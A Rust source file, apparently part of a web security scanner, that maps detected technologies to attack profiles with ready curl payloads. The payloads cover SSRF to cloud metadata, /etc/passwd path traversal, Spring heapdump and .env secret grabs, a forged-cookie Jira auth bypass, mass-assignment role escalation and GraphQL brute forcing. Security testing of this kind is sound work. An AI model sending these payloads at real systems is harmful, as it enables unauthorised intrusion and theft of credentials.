
#[derive(Debug, Clone, serde::Serialize)]
pub struct AttackProfile {
    pub technology: String,
    pub version: Option<String>,
    pub priority: u8, // 1-10, higher = more likely to yield results
    pub tests: Vec<TechTest>,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct TechTest {
    pub name: String,
    pub description: String,
    pub vulnerability_type: String,
    pub severity_guess: String,
    pub test_instructions: String,
    pub curl_example: String,
}

/// Map of technology names to their known attack patterns.
pub struct ProfileMatcher;

impl ProfileMatcher {
    pub fn new() -> Self { Self }

    /// Get attack profiles for a detected technology list.
    pub fn get_profiles(&self, tech_list: &[String]) -> Vec<AttackProfile> {
        let mut profiles = Vec::new();
        for tech in tech_list {
            if let Some(profile) = self.match_technology(tech) {
                profiles.push(profile);
            }
        }
        profiles.sort_by_key(|b| std::cmp::Reverse(b.priority));
        profiles
    }

    fn match_technology(&self, tech: &str) -> Option<AttackProfile> {
        let lower = tech.to_lowercase();
        let (base, version) = if let Some(idx) = lower.rfind(' ') {
            (lower[..idx].to_string(), Some(lower[idx+1..].to_string()))
        } else {
            (lower.clone(), None)
        };

        match base.as_str() {
            "next.js" | "nextjs" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 9, tests: vec![
                    TechTest { name: "Next.js SSRF via _next/image".into(), description: "Next.js image optimization can be abused for SSRF".into(), vulnerability_type: "SSRF".into(), severity_guess: "HIGH".into(), test_instructions: "Try fetching internal URLs via /_next/image?url=http://169.254.169.254/".into(), curl_example: "curl 'https://target/_next/image?url=http://169.254.169.254/latest/meta-data/'".into() },
                    TechTest { name: "Next.js Path Traversal via _next/data".into(), description: "Next.js data routes may allow path traversal".into(), vulnerability_type: "LFI".into(), severity_guess: "HIGH".into(), test_instructions: "Try path traversal in _next/data routes".into(), curl_example: "curl 'https://target/_next/data/../../../etc/passwd'".into() },
                    TechTest { name: "Next.js middleware bypass".into(), description: "Next.js middleware can sometimes be bypassed using URL encoding or double-encoding".into(), vulnerability_type: "Auth Bypass".into(), severity_guess: "CRITICAL".into(), test_instructions: "Try encoding bypasses on protected routes".into(), curl_example: "curl --path-as-is 'https://target/admin%3F.js'".into() },
                ],
            }),
            "graphql" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 9, tests: vec![
                    TechTest { name: "GraphQL Introspection".into(), description: "Check if GraphQL introspection is enabled".into(), vulnerability_type: "Info Leak".into(), severity_guess: "MEDIUM".into(), test_instructions: "Send introspection query to GraphQL endpoint".into(), curl_example: "curl -X POST 'https://target/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"query { __schema { types { name } } }\"}'".into() },
                    TechTest { name: "GraphQL Batching Attack".into(), description: "Use batched queries to bypass rate limiting".into(), vulnerability_type: "Auth Bypass".into(), severity_guess: "HIGH".into(), test_instructions: "Send multiple queries in a single request to brute force".into(), curl_example: "curl -X POST 'https://target/graphql' -H 'Content-Type: application/json' -d '[{\"query\":\"query { login(pass: \\\"admin\\\") }\"}]'".into() },
                    TechTest { name: "GraphQL Query Depth DoS".into(), description: "Deeply nested queries can cause DoS".into(), vulnerability_type: "DoS".into(), severity_guess: "MEDIUM".into(), test_instructions: "Send deeply nested query".into(), curl_example: "".into() },
                ],
            }),
            "spring" | "spring boot" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 8, tests: vec![
                    TechTest { name: "Spring Boot Actuators".into(), description: "Check for exposed actuator endpoints".into(), vulnerability_type: "Info Leak".into(), severity_guess: "HIGH".into(), test_instructions: "Try common actuator paths".into(), curl_example: "curl 'https://target/actuator/env'".into() },
                    TechTest { name: "Spring Boot heapdump".into(), description: "Heap dump contains all runtime secrets".into(), vulnerability_type: "Secret Leak".into(), severity_guess: "CRITICAL".into(), test_instructions: "Download heapdump and extract secrets".into(), curl_example: "curl 'https://target/actuator/heapdump' -o heapdump.bin".into() },
                ],
            }),
            "laravel" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 8, tests: vec![
                    TechTest { name: "Laravel Debug Mode".into(), description: "Laravel APP_DEBUG=true exposes full error traces".into(), vulnerability_type: "Info Leak".into(), severity_guess: "HIGH".into(), test_instructions: "Trigger an error to see debug trace".into(), curl_example: "curl 'https://target/nonexistent-route'".into() },
                    TechTest { name: "Laravel .env exposure".into(), description: "Check if .env file is publicly accessible".into(), vulnerability_type: "Secret Leak".into(), severity_guess: "CRITICAL".into(), test_instructions: "Access .env file directly".into(), curl_example: "curl 'https://target/.env'".into() },
                ],
            }),
            "rails" | "ruby on rails" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 7, tests: vec![
                    TechTest { name: "Rails Mass Assignment".into(), description: "Check for mass-assignable sensitive attributes".into(), vulnerability_type: "Privilege Escalation".into(), severity_guess: "HIGH".into(), test_instructions: "Try adding admin=true or role=admin to API requests".into(), curl_example: "curl -X PATCH 'https://target/api/users/me' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'".into() },
                ],
            }),
            "wordpress" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 7, tests: vec![
                    TechTest { name: "WordPress User Enumeration".into(), description: "WordPress leaks usernames via REST API".into(), vulnerability_type: "Info Leak".into(), severity_guess: "LOW".into(), test_instructions: "Query WP REST API for users".into(), curl_example: "curl 'https://target/wp-json/wp/v2/users'".into() },
                    TechTest { name: "WordPress Debug Log".into(), description: "Check for debug.log exposure".into(), vulnerability_type: "Info Leak".into(), severity_guess: "MEDIUM".into(), test_instructions: "Access debug.log".into(), curl_example: "curl 'https://target/wp-content/debug.log'".into() },
                ],
            }),
            "apache" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 7, tests: vec![
                    TechTest { name: "Apache Path Traversal".into(), description: "Known path traversal patterns for Apache".into(), vulnerability_type: "LFI".into(), severity_guess: "CRITICAL".into(), test_instructions: "Try .%2e/ encoding techniques".into(), curl_example: "curl --path-as-is 'https://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'".into() },
                ],
            }),
            "kubernetes" | "k8s" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 9, tests: vec![
                    TechTest { name: "K8s API Exposure".into(), description: "Check if Kubernetes API server is exposed".into(), vulnerability_type: "Info Leak".into(), severity_guess: "CRITICAL".into(), test_instructions: "Check common K8s API paths".into(), curl_example: "curl -k 'https://target:6443/api'".into() },
                    TechTest { name: "K8s Dashboard Exposure".into(), description: "Check for exposed Kubernetes dashboard".into(), vulnerability_type: "Auth Bypass".into(), severity_guess: "CRITICAL".into(), test_instructions: "Access /api/v1/namespaces/default/".into(), curl_example: "curl 'https://target/api/v1/namespaces/default/pods'".into() },
                ],
            }),
            "jira" => Some(AttackProfile {
                technology: tech.to_string(), version,
                priority: 8, tests: vec![
                    TechTest { name: "Jira CVE-2022-0540".into(), description: "Authentication bypass in Jira Seraph".into(), vulnerability_type: "Auth Bypass".into(), severity_guess: "CRITICAL".into(), test_instructions: "Try accessing privileged endpoints with forged cookie".into(), curl_example: "curl -H 'Cookie: seraph.rememberme=user=admin' 'https://target/secure/admin'".into() },
                ],
            }),
            _ => None,
        }
    }
}

impl Default for ProfileMatcher { fn default() -> Self { Self::new() } }

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_nextjs_profiles() {
        let matcher = ProfileMatcher::new();
        let profiles = matcher.get_profiles(&["Next.js 14.0.1".into()]);
        assert!(!profiles.is_empty());
        assert!(profiles[0].tests.iter().any(|t| t.name.contains("SSRF")));
    }
    #[test]
    fn test_graphql_profile() {
        let matcher = ProfileMatcher::new();
        let profiles = matcher.get_profiles(&["GraphQL".into()]);
        assert!(!profiles.is_empty());
    }
    #[test]
    fn test_spring_profile() {
        let matcher = ProfileMatcher::new();
        let profiles = matcher.get_profiles(&["Spring Boot 3.2".into()]);
        assert!(!profiles.is_empty());
    }
    #[test]
    fn test_unknown_technology() {
        let matcher = ProfileMatcher::new();
        let profiles = matcher.get_profiles(&["Unknown Tech v1.0".into()]);
        assert!(profiles.is_empty());
    }
}
